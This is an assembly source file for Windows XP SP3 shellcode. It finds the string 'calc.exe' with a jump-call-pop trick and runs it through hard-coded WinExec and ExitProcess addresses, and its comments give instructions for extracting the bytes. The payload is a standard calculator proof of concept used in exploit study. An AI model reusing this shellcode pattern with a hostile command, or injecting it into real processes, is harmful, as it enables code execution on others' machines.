; Author	: RIZAL MUHAMMED [UB3RSiCK]
; Date		: 21/03/2018
; Filename	: calc.nasm

; WINDOWS XP SP3 - Calc shellcode
;
; WinExec is located at 0x7c8623ad in kernel32.dll
; ExitProcess is located at 0x7c81cafa in kernel32.dll
;
; Compile using nasm
; Compile	: nasm -f elf32 calc.nasm -o calc.o
; Link		: ld calc.o -o calc
; Shellcode	: use objdump

section .text
global _start

_start:
	jmp short getCommand
		retCommand:
			xor edx, edx
			pop ebx
			mov [ebx + 8], dl		; NULL terminate command string
			
			; UINT WINAPI WinExec(
			;	  _In_ LPCSTR lpCmdLine,
			;	  _In_ UINT   uCmdShow
			; ); 
			
			push eax			; uCmdShow
			push ebx			; calc.exe
			mov ecx, 0x7c8623ad		; WinExec
			call ecx

			xor eax, eax
			push eax
			mov ebx, 0x7c81cafa		; ExitProcess
			call ebx
			
	getCommand:
		call retCommand
		db 'calc.exeN'
